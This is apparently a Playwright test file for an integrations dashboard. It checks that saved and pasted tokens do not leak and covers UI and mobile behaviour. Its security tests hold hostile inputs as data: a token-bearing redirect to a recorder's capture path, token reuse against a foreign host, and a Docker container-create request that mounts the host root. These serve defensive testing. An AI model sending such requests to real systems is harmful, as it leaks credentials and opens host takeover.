// Round 2 (gauntlet r1 Fix List): the security replays over HTTP (items 1 to 4), and the
// usability, quality-bar and mobile fixes (items 5 to 11 and 13) in the real UI. The live Prometheus
// (ATRIUM_TEST_PROM_URL, kept outside git) is read-only. Test-only secrets; none are real.
import Database from "better-sqlite3";
import { appendFileSync, writeFileSync } from "node:fs";
import path from "node:path";
import type { Page } from "@playwright/test";
import { test, expect } from "../fixtures";
import { captureTraffic, openAdvanced, DATA_DIR, ev, ORIGIN, themedContext, type Theme, shot } from "./helpers";
import { FAKE, fakeHomeApi, fakeNpm, fakeRecorder, type HomeApi } from "./fakes";

test.skip(process.env.ATRIUM_E2E_SCENARIO === "locked", "normal scenario");
test.beforeEach(({}, info) => test.skip(info.project.name !== "desktop", "desktop project (mobile cases set their own viewport)"));

let api: HomeApi;
test.beforeAll(async () => { api = await fakeHomeApi(); });
const LIVE_PROM = process.env.ATRIUM_TEST_PROM_URL;
test.afterAll(async () => { await api.close(); });

const SEC_LOG = ev("security/http-replay.jsonl");
writeFileSync(SEC_LOG, "");
const log = (step: string, data: unknown) => appendFileSync(SEC_LOG, `${JSON.stringify({ step, data })}\n`);

async function tryCurl(page: Page) {
  await page.goto("/integrations/new/by-example");
  await page.locator("[data-try-input]").fill(`curl -s '${api.url}/api/stats' -H 'Authorization: Bearer ${FAKE.curlBearer}' -H 'Accept: application/json'`);
  await page.locator("[data-try-button]").click();
  await expect(page.locator("[data-response-tree]")).toBeVisible({ timeout: 10_000 });
}

test.describe("security replays over HTTP (Fix List items 1 to 4)", () => {
  test("finding 1: a saved NPM token is never sent to a new host by test, retarget or read", async ({ browser }) => {
    const npm = await fakeNpm();
    const b = await fakeRecorder();
    const ctx = await themedContext(browser, "daylight");
    const r = ctx.request;
    const headers = { origin: ORIGIN };
    const created = await (await r.post("/api/integrations", { data: { packageId: "npm", name: "NPM probe", config: { baseUrl: npm.url }, secrets: { token: FAKE.npmGood }, untested: true }, headers })).json();
    const id = created.id as string;
    const t = await r.post(`/api/integrations/${id}/test`, { data: { config: { baseUrl: b.url }, secrets: {} }, headers });
    const tBody = await t.json();
    log("1 test with foreign baseUrl", { status: t.status(), body: tBody, bSaw: b.seen });
    expect(tBody).toMatchObject({ ok: false, error: { code: "permission" } });
    const p = await r.patch(`/api/integrations/${id}`, { data: { config: { baseUrl: b.url } }, headers });
    const pBody = await p.json();
    log("2 PATCH baseUrl without confirmation", { status: p.status(), body: pBody });
    expect(p.status()).toBe(409);
    expect(pBody.error.code).toBe("secrets_pinned");
    const d = await r.get(`/api/data/endpoint?integration=${id}&endpoint=proxy-hosts`);
    log("3 data read after refused retarget", { status: d.status(), body: await d.json() });
    const moved = await r.patch(`/api/integrations/${id}`, { data: { config: { baseUrl: b.url }, clearSecrets: true }, headers });
    const mBody = await moved.json();
    expect(mBody.secrets.find((s: { key: string }) => s.key === "token").set).toBe(false);
    await r.get(`/api/data/endpoint?integration=${id}&endpoint=proxy-hosts`);
    log("4 confirmed move deletes the secret; B saw", b.seen);
    expect(JSON.stringify(b.seen)).not.toContain(FAKE.npmGood);
    expect(b.seen.every((s) => s.headers.authorization === undefined)).toBe(true);
    await r.delete(`/api/integrations/${id}`, { headers });
    await ctx.close();
    await npm.close();
    await b.close();
  });

  test("findings 2 and 3: a pasted bearer token does not follow a redirect; finding 4: no POST to loopback", async ({ browser }) => {
    const b = await fakeRecorder();
    const ctx = await themedContext(browser, "daylight");
    const r = ctx.request;
    const headers = { origin: ORIGIN };
    // Replay of try-it-secret-leaks.txt step 3: a pasted bearer token and a 302 to another host.
    const redir = await r.post("/api/integrations/try", { data: { curl: `curl '${api.url}/api/redir?to=${encodeURIComponent(`${b.url}/capture`)}' -H 'Authorization: Bearer ${FAKE.curlBearer}'` }, headers });
    const rb = await redir.json();
    log("2 pending bearer and a cross-host redirect", { body: rb, bSaw: b.seen });
    expect(rb).toMatchObject({ ok: false, error: { code: "permission", message: expect.stringContaining("does not send credentials there") } });
    expect(b.seen).toHaveLength(0);
    expect(JSON.stringify(rb)).not.toContain(FAKE.curlBearer);
    // The held token cannot be pointed at B directly either.
    const reuse = await r.post("/api/integrations/try", { data: { url: `${b.url}/capture`, auth: { pendingId: rb.pendingId } }, headers });
    const reuseBody = await reuse.json();
    log("2b pending token to another origin", { body: reuseBody, bSaw: b.seen });
    expect(reuseBody).toMatchObject({ ok: false, error: { code: "permission" } });
    expect(b.seen).toHaveLength(0);
    const typed = await r.post("/api/integrations/try", { data: { url: `${b.url}/echo`, headers: { Authorization: `Bearer ${FAKE.curlBearer}` } }, headers });
    const typedBody = await typed.json();
    log("3 credential typed as a header", typedBody);
    expect(typedBody).toMatchObject({ ok: false, error: { code: "config" } });
    expect(JSON.stringify(typedBody)).not.toContain(FAKE.curlBearer);
    const post = await r.post("/api/integrations/try", { data: { url: `${b.url}/v1.43/containers/create`, method: "POST", headers: { "x-anything": "set-by-member" }, body: JSON.stringify({ Image: "alpine", HostConfig: { Binds: ["/:/host"] } }) }, headers });
    const postBody = await post.json();
    log("4 POST to loopback", { body: postBody, bSaw: b.seen });
    expect(postBody).toMatchObject({ ok: false, error: { code: "permission" } });
    expect(b.seen).toHaveLength(0);
    await ctx.close();
    await b.close();
  });
});

test("by example: kept headers, pruned picks, a reason by a disabled Save, readable paths, role help, filter and collapse (items 6, 7, 13)", async ({ browser }) => {
  const ctx = await themedContext(browser, "daylight");
  const page = await ctx.newPage();
  captureTraffic(page, "r2-by-example");
  await tryCurl(page);
  await expect(page.locator('[data-kept-header="Accept"]')).toContainText("Accept: application/json");
  await page.locator('[data-tree-leaf="$.history[0].t"]').click();
  await expect(page.locator("[data-role-picker] [data-role-help]")).toHaveCount(5);
  await expect(page.locator("[data-role-picker]")).toContainText("When each point happened");
  await page.locator('[data-role-picker] [data-role="time"]').click();
  await expect(page.locator('[data-picks] [data-pick-path="$.history[0].t"]')).toBeVisible();
  // A new Try it on another path drops the pick and says so.
  await page.locator("[data-try-input]").fill(`${api.url}/api/open`);
  await page.locator("[data-try-button]").click();
  await expect(page.locator("[data-pruned]")).toContainText("1 earlier pick was removed");
  await expect(page.locator("[data-pruned]")).toContainText("history > item 1 > t");
  // Back to stats: filter, collapse, name suggestion.
  await page.locator("[data-try-input]").fill(`${api.url}/api/stats`);
  await page.locator("[data-try-button]").click();
  await page.locator("[data-tree-filter]").fill("uptime");
  await expect(page.locator("[data-tree-leaf]")).toHaveCount(1);
  await page.locator("[data-tree-filter]").fill("");
  await page.locator('[data-tree-branch="$.history"]').click();
  await expect(page.locator('[data-tree-leaf="$.history[0].t"]')).toHaveCount(0);
  await page.locator('[data-tree-leaf="$.uptimeSec"]').click();
  await page.locator('[data-role-picker] [data-role="value"]').click();
  await expect(page.locator("[data-ep-name]")).toHaveValue("Uptime sec");
  await page.locator("[data-refresh]").fill("5");
  await expect(page.locator("[data-save-endpoint]")).toBeDisabled();
  await expect(page.locator("[data-save-why]")).toHaveText("Refresh must be at least 10 seconds.");
  await shot(page, "screens/r2-save-why-daylight.png");
  await page.locator("[data-refresh]").fill("60");
  await page.locator("[data-save-endpoint]").click();
  await page.waitForURL(/\/integrations\/[0-9a-f-]{36}$/, { timeout: 15_000 });
  const id = page.url().split("/").pop()!;
  await expect(page.locator("[data-next-step]").first()).toContainText("use it in an app");
  // The non-secret header was saved with the endpoint; the token was not.
  const db = new Database(path.join(DATA_DIR, "atrium.db"), { readonly: true, fileMustExist: true });
  const rec = (db.prepare("SELECT record FROM custom_endpoint WHERE integration_id = ?").get(id) as { record: string }).record;
  db.close();
  expect(JSON.parse(rec).headers).toEqual({ Accept: "application/json" });
  expect(rec).not.toContain(FAKE.curlBearer);
  // A second endpoint on the same host goes into this integration by default.
  await page.goto(`/integrations/new/by-example?url=${encodeURIComponent(`${api.url}/api/open`)}`);
  await page.locator("[data-try-button]").click();
  await page.locator('[data-tree-leaf="$.load"]').click();
  await page.locator('[data-role-picker] [data-role="value"]').click();
  await expect(page.locator(`[data-save-target-option="${id}"]`)).toBeChecked();
  await page.locator("[data-save-endpoint]").click();
  await page.waitForURL(new RegExp(`/integrations/${id}$`), { timeout: 15_000 });
  await expect(page.locator('[data-endpoint="load"]')).toBeVisible();
  await ctx.close();
});

test("Try it on a 4xx quotes the service's own reason (item 9)", async ({ browser }) => {
  const ctx = await themedContext(browser, "daylight");
  const page = await ctx.newPage();
  await page.goto("/integrations/new/by-example");
  await page.locator("[data-try-input]").fill(`${api.url}/api/bad`);
  await page.locator("[data-try-button]").click();
  await expect(page.locator("[data-error-heading]")).toHaveText("Unexpected response");
  await expect(page.locator("[data-error-code=bad_response]")).toContainText('The service said: "Latitude must be in range of -90 to 90°. Given: 900.0."');
  await shot(page, "screens/r2-service-said-daylight.png");
  await ctx.close();
});

test("Prometheus login choices show only the fields each needs (item 10)", async ({ browser }) => {
  for (const theme of ["daylight", "dusk", "solid"] as Theme[]) {
    const ctx = await themedContext(browser, theme);
    const page = await ctx.newPage();
    await page.goto("/integrations/new/prometheus?baseUrl=http%3A%2F%2F10.77.99.7%3A9090");
    await expect(page.locator('[data-config="authMode"]')).toHaveValue("none");
    await expect(page.locator("[data-secret]")).toHaveCount(0);
    await expect(page.locator('[data-config="username"]')).toHaveCount(0);
    await page.locator('[data-config="authMode"]').selectOption("basic");
    await expect(page.locator('[data-config="username"]')).toBeVisible();
    await expect(page.locator('[data-secret="password"]')).toBeVisible();
    await expect(page.locator('[data-secret="token"]')).toHaveCount(0);
    if (theme === "daylight") {
      await page.locator('[data-config="authMode"]').selectOption("bearer");
      await expect(page.locator('[data-secret="token"]')).toBeVisible();
      await expect(page.locator('[data-config="username"]')).toHaveCount(0);
      await page.locator('[data-config="authMode"]').selectOption("basic");
    }
    await shot(page, `screens/r2-prometheus-login-${theme}.png`);
    await ctx.close();
  }
});

test("Prometheus detail: up/down/total headline, a range chart, examples, Query error (items 9, 10, live)", async ({ browser }) => {
  test.skip(!LIVE_PROM, "needs ATRIUM_TEST_PROM_URL");
  const bare = LIVE_PROM!.replace(/^https?:\/\//, "");
  const ctx0 = await themedContext(browser, "daylight");
  const created = await (await ctx0.request.post("/api/integrations", { data: { packageId: "prometheus", name: "Prometheus live", config: { baseUrl: bare }, secrets: {}, untested: true }, headers: { origin: ORIGIN } })).json();
  // A bare address gets http:// on the server too (item 13).
  expect(created.config.baseUrl).toBe(`http://${bare}`);
  await ctx0.close();
  for (const theme of ["daylight", "dusk", "solid"] as Theme[]) {
    const ctx = await themedContext(browser, theme);
    const page = await ctx.newPage();
    await page.goto(`/integrations/${created.id}`);
    const targets = page.locator('[data-endpoint="targets"]');
    await expect(targets.locator("[data-status-headline]")).toContainText(/\d+ up/, { timeout: 15_000 });
    const up = Number((await targets.locator("[data-count-up]").textContent())!.split(" ")[0]);
    const down = Number((await targets.locator("[data-count-down]").textContent())!.split(" ")[0]);
    const total = Number(await targets.locator("[data-count-total]").textContent());
    expect(up + down).toBeLessThanOrEqual(total);
    if (total > 6) {
      await targets.locator("[data-status-more]").click();
      await expect(targets.locator("li")).toHaveCount(total);
    }
    await openAdvanced(page);
    const query = page.locator('[data-endpoint="query"]');
    await expect(query.locator("[data-preview-why]")).toHaveText("Type a query to preview");
    await expect(query.locator('[data-param="query"]')).toHaveAttribute("placeholder", "count(up)");
    if (theme === "daylight") {
      await query.locator('[data-param="query"]').fill("up{");
      await query.locator("[data-preview-button]").click();
      await expect(query.locator("[data-read-error]")).toContainText("Query error", { timeout: 10_000 });
      await expect(query.locator("[data-read-error]")).toContainText("parse error");
      await expect(query.locator("[data-no-data]")).toHaveCount(0);
    }
    await query.locator('[data-example="count(up)"]').click();
    await query.locator("[data-preview-button]").click();
    await expect(query.locator("[data-stat-value]")).toHaveText(/^\d+$/, { timeout: 10_000 });
    const range = page.locator('[data-endpoint="range"]');
    await range.locator('[data-example="up"]').click();
    await range.locator("[data-preview-button]").click();
    await expect(range.locator("[data-series-chart] svg[role=img]")).toBeVisible({ timeout: 10_000 });
    for (const t of await range.locator("[data-series-latest]").allTextContents()) expect(t.replace(/[^0-9.]/g, "").length).toBeLessThanOrEqual(8);
    await shot(page, `screens/r2-prometheus-detail-${theme}.png`);
    await ctx.close();
  }
});

test.describe("mobile 390 wide, touch (items 5 and 11)", () => {
  test("the response tree and role picker are usable by touch, with no scroll box of their own", async ({ browser }) => {
    const ctx = await themedContext(browser, "daylight", { mobile: true });
    const page = await ctx.newPage();
    await tryCurl(page);
    const leaf = page.locator('[data-tree-leaf="$.load"]');
    const box = (await leaf.boundingBox())!;
    const font = await leaf.locator("[data-leaf-value]").evaluate((el) => parseFloat(getComputedStyle(el).fontSize));
    const scrollBoxes = await page.locator("[data-response-tree]").evaluate((root) => [root, ...root.querySelectorAll("*")].filter((el) => ["auto", "scroll"].includes(getComputedStyle(el).overflowY)).length);
    await leaf.click();
    const roles = await page.locator("[data-role-picker] [data-role]").evaluateAll((els) => els.map((e) => { const r = e.getBoundingClientRect(); return { w: r.width, h: r.height }; }));
    const helpVisible = await page.locator("[data-role-picker] [data-role-help]").first().isVisible();
    const measured = { leaf: { w: box.width, h: box.height, font }, scrollBoxes, roles, helpVisible };
    writeFileSync(ev("logs/mobile-tree-measure.json"), JSON.stringify(measured, null, 2));
    expect(box.height).toBeGreaterThanOrEqual(44);
    expect(box.width).toBeGreaterThanOrEqual(44);
    expect(font).toBeGreaterThanOrEqual(14);
    expect(scrollBoxes).toBe(0);
    for (const r of roles) { expect(r.w).toBeGreaterThanOrEqual(44); expect(r.h).toBeGreaterThanOrEqual(44); }
    expect(helpVisible).toBe(true);
    expect(await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)).toBeLessThanOrEqual(0);
    await shot(page, "screens/r2-mobile-tree-390x844.png");
    await ctx.close();
  });

  test("setup form: 16px inputs, URL keyboard, a 44px Verify TLS row, and the token field above the keyboard", async ({ browser }) => {
    const npm = await fakeNpm();
    const ctx = await themedContext(browser, "daylight", { mobile: true });
    const page = await ctx.newPage();
    await page.goto(`/integrations/new/npm?baseUrl=${encodeURIComponent(npm.url)}`);
    const url = page.locator('[data-config="baseUrl"]');
    await expect(page.locator('[data-config-row="verifyTls"]')).toBeVisible();
    await page.waitForLoadState("networkidle").catch(() => undefined);
    const attrs = await url.evaluate((el) => ({ inputmode: el.getAttribute("inputmode"), autocapitalize: el.getAttribute("autocapitalize"), autocorrect: el.getAttribute("autocorrect"), font: parseFloat(getComputedStyle(el).fontSize) }));
    const fonts = await page.locator("[data-setup-form] input:not([type=checkbox]), [data-setup-form] select").evaluateAll((els) => els.map((e) => parseFloat(getComputedStyle(e).fontSize)));
    const row = (await page.locator('[data-config-row="verifyTls"]').boundingBox())!;
    const check = (await page.locator('[data-config="verifyTls"]').boundingBox())!;
    const accent = await page.locator('[data-config="verifyTls"]').evaluate((el) => getComputedStyle(el).accentColor);
    // Simulate the on-screen keyboard: the visual viewport shrinks to 508px tall.
    await page.setViewportSize({ width: 390, height: 508 });
    await page.locator('[data-secret="token"]').focus();
    await page.waitForTimeout(700);
    const kb = await page.evaluate(() => {
      const f = document.activeElement!.getBoundingClientRect();
      const bars = [...document.querySelectorAll('[data-shell="tabbar"]')].map((b) => b.getBoundingClientRect()).filter((r) => r.height > 0);
      const bar = bars[0];
      const btn = document.querySelector("[data-test-button]")!.getBoundingClientRect();
      return { fieldTop: f.top, fieldBottom: f.bottom, vh: window.innerHeight, tabbarTop: bar ? bar.top : window.innerHeight, testButtonBottom: btn.bottom };
    });
    const measured = { attrs, fonts, verifyTlsRow: { h: row.height }, checkbox: { w: check.width, h: check.height }, accent, keyboard: kb };
    writeFileSync(ev("logs/mobile-setup-measure.json"), JSON.stringify(measured, null, 2));
    await page.screenshot({ path: ev("screens/r2-mobile-setup-keyboard-390x508.png") });
    expect(attrs).toMatchObject({ inputmode: "url", autocapitalize: "off", autocorrect: "off" });
    for (const f of fonts) expect(f).toBeGreaterThanOrEqual(16);
    expect(row.height).toBeGreaterThanOrEqual(44);
    expect(check.width).toBeGreaterThanOrEqual(20);
    expect(kb.fieldTop).toBeGreaterThanOrEqual(0);
    // The r1 critic saw the tab bar move to y=444 in this viewport; hold to that even if it is hidden here.
    const limit = Math.min(kb.tabbarTop, 444);
    expect(kb.fieldBottom).toBeLessThanOrEqual(limit);
    expect(kb.testButtonBottom).toBeLessThanOrEqual(limit);
    await ctx.close();
    await npm.close();
  });
});
